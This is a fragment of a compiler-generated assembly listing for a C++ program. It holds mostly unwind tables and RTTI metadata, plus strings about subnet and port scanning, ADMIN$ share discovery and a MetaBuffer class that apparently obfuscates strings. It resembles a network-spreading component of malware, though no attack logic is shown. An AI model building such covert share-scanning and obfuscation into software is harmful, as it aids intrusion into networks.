	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2684
	DD	imagerel $unwind$??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Convert_size@_K_K@std@@YA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN5
	DD	imagerel $LN5+522
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$max@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+119
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+98
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$min@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN5
	DD	imagerel $LN5+94
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN4
	DD	imagerel $LN4+93
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN12
	DD	imagerel $LN12+154
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@
CONST	SEGMENT
??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'c', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'p'
	DB	00H, 'o', 00H, 'r', 00H, 't', 00H, ' ', 00H, 's', 00H, 'c', 00H
	DB	'a', 00H, 'n', 00H, ' ', 00H, 't', 00H, 'h', 00H, 'r', 00H, 'e'
	DB	00H, 'a', 00H, 'd', 00H, '.', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@
CONST	SEGMENT
??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'c', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'h'
	DB	00H, 'o', 00H, 's', 00H, 't', 00H, ' ', 00H, 't', 00H, 'h', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 'd', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@
CONST	SEGMENT
??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'g', 00H
	DB	'e', 00H, 't', 00H, ' ', 00H, 's', 00H, 'u', 00H, 'b', 00H, 'n'
	DB	00H, 'e', 00H, 't', 00H, 's', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@
CONST	SEGMENT
??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'c', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'i'
	DB	00H, 'o', 00H, ' ', 00H, 'c', 00H, 'o', 00H, 'm', 00H, 'p', 00H
	DB	'l', 00H, 'e', 00H, 't', 00H, 'i', 00H, 'o', 00H, 'n', 00H, ' '
	DB	00H, 'p', 00H, 'o', 00H, 'r', 00H, 't', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@
CONST	SEGMENT
??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'g', 00H
	DB	'e', 00H, 't', 00H, ' ', 00H, 'C', 00H, 'o', 00H, 'n', 00H, 'n'
	DB	00H, 'e', 00H, 'c', 00H, 't', 00H, 'E', 00H, 'x', 00H, '.', 00H
	DB	00H, 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@
CONST	SEGMENT
??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@ DB 'S'
	DB	00H, 't', 00H, 'a', 00H, 'r', 00H, 't', 00H, 'i', 00H, 'n', 00H
	DB	'g', 00H, ' ', 00H, 's', 00H, 'e', 00H, 'a', 00H, 'r', 00H, 'c'
	DB	00H, 'h', 00H, ' ', 00H, 'o', 00H, 'n', 00H, ' ', 00H, 's', 00H
	DB	'h', 00H, 'a', 00H, 'r', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's'
	DB	00H, '.', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@
CONST	SEGMENT
??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@ DB 'F'
	DB	00H, 'o', 00H, 'u', 00H, 'n', 00H, 'd', 00H, ' ', 00H, 's', 00H
	DB	'h', 00H, 'a', 00H, 'r', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's'
	DB	00H, '.', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_13FPGAJAPJ@?$AA?2@
CONST	SEGMENT
??_C@_13FPGAJAPJ@?$AA?2@ DB '\', 00H, 00H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_15LEKKCGMK@?$AA?2?$AA?2@
CONST	SEGMENT
??_C@_15LEKKCGMK@?$AA?2?$AA?2@ DB '\', 00H, '\', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@
CONST	SEGMENT
??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@ DB 'A', 00H, 'D', 00H, 'M'
	DB	00H, 'I', 00H, 'N', 00H, '$', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_04FAGBOJJK@169?4@
CONST	SEGMENT
??_C@_04FAGBOJJK@169?4@ DB '169.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_03LJEAFDJL@10?4@
CONST	SEGMENT
??_C@_03LJEAFDJL@10?4@ DB '10.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_08NABKCMOE@192?4168?4@
CONST	SEGMENT
??_C@_08NABKCMOE@192?4168?4@ DB '192.168.', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_04OEIIGBBO@172?4@
CONST	SEGMENT
??_C@_04OEIIGBBO@172?4@ DB '172.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@ DB 'G'
	DB	00H, 'e', 00H, 't', 00H, 'I', 00H, 'p', 00H, 'N', 00H, 'e', 00H
	DB	't', 00H, 'T', 00H, 'a', 00H, 'b', 00H, 'l', 00H, 'e', 00H, ' '
	DB	00H, 'f', 00H, 'a', 00H, 'i', 00H, 'l', 00H, 's', 00H, '.', 00H
	DB	' ', 00H, 'G', 00H, 'e', 00H, 't', 00H, 'L', 00H, 'a', 00H, 's'
	DB	00H, 't', 00H, 'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H
	DB	' ', 00H, '=', 00H, ' ', 00H, '%', 00H, 'l', 00H, 'u', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
